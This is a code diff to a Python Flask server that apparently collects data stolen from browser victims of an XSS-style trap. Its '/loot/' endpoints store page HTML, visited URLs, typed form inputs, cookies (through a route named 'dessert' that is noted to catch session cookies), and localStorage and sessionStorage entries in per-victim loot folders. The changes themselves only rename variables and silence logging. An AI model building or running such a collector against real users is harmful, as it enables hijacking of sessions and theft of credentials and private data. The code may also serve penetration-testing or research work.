@@ -49,7 +49,7 @@ def printHeader():
 # Support Data
 SessionDirectories = {}
 SessionImages = {}
-SessionDom = {}
+SessionHTML = {}
 lootDirCounter = 1
 
 logFileName = "sessionLog.txt"
@@ -105,7 +105,7 @@ def findLootDirectory(identifier):
 
         # Initialize our number trackers
         SessionImages[identifier] = 1;
-        SessionDom[identifier] = 1;
+        SessionHTML[identifier] = 1;
 
     lootDir = "client_" + str(SessionDirectories[identifier])
     #print("Loot directory is: " + lootDir)
@@ -167,28 +167,26 @@ def recordScreenshot(identifier):
 
 
 
-# Capture the DOM
-@app.route('/loot/dom/<identifier>', methods=['POST'])
-def recordDOM(identifier):
-    # print("Got DOM from: " + identifier)
+# Capture the HTML seen
+@app.route('/loot/html/<identifier>', methods=['POST'])
+def recordHTML(identifier):
+    # print("Got HTML from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json 
     url = content['url']
-    trapDom = content['dom']
-    # print("Got DOM for URL: " + url)
-    # print("Dom: " + str(trapDom))
+    trapHTML = content['html']
 
 
-    if identifier in SessionDom.keys():
-        domNumber = SessionDom[identifier]
-        SessionDom[identifier] = domNumber + 1
+    if identifier in SessionHTML.keys():
+        htmlNumber = SessionHTML[identifier]
+        SessionHTML[identifier] = htmlNumber + 1
     else:
-        raise RuntimeError("Session dom counter not found")
+        raise RuntimeError("Session HTML counter not found")
         quit()
 
-    with open ("./loot/" + lootDir + "/" + str(domNumber) + "_domCopy.html", "w") as html_file:
-        logEvent(identifier, "HTML Copy: " + str(domNumber) + "_domCopy.html")
-        html_file.write(trapDom)
+    with open ("./loot/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html", "w") as html_file:
+        logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
+        html_file.write(trapHTML)
         html_file.close()
 
 
@@ -200,7 +198,7 @@ def recordDOM(identifier):
 # Record new URL visited in trap
 @app.route('/loot/location/<identifier>', methods=['POST'])
 def recordUrl(identifier):
-    print("New URL recorded from: " + identifier)
+    # print("New URL recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json
     url = content['url']
@@ -215,7 +213,7 @@ def recordUrl(identifier):
 # Record user inputs
 @app.route('/loot/input/<identifier>', methods=['POST'])
 def recordInput(identifier):
-    print("New input recorded from: " + identifier)
+    # print("New input recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json
     inputName = content['inputName']
@@ -232,7 +230,7 @@ def recordInput(identifier):
 # which would probably include any session cookies. Probably. 
 @app.route('/loot/dessert/<identifier>', methods=['POST'])
 def recordCookie(identifier):
-    print("New cookie recorded from: " + identifier)
+    # print("New cookie recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json
     # print("**** New cookie report: " + content)
@@ -247,7 +245,7 @@ def recordCookie(identifier):
 # Record local storage data bits
 @app.route('/loot/localstore/<identifier>', methods=['POST'])
 def recordLocalStorageEntry(identifier):
-    print("New localStorage data recorded from: " + identifier)
+    # print("New localStorage data recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json
     localStorageKey = content['key']
@@ -261,7 +259,7 @@ def recordLocalStorageEntry(identifier):
 # Record session storage data bits
 @app.route('/loot/sessionstore/<identifier>', methods=['POST'])
 def recordSessionStorageEntry(identifier):
-    print("New sessionStorage data recorded from: " + identifier)
+    # print("New sessionStorage data recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json 
     sessionStorageKey = content['key']
